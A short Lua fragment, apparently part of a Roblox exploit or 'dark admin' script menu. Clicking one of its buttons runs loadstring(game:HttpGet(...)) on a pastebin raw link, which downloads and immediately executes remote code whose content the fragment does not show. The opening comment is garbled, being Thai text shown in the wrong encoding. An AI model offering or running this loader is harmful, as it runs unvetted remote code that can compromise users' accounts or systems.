-- (‡∏™‡∏£‡πâ‡∏≤‡∏á popup ‡∏Ñ‡∏£‡∏ö)

darkAdminBtn.MouseButton1Click:Connect(function()
    darkPopup.Visible = true
end)

local runBtnDark = Instance.new("TextButton")
runBtnDark.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/P7Y6U7UL"))()
    darkPopup.Visible = false
    notifySuccess()
end)

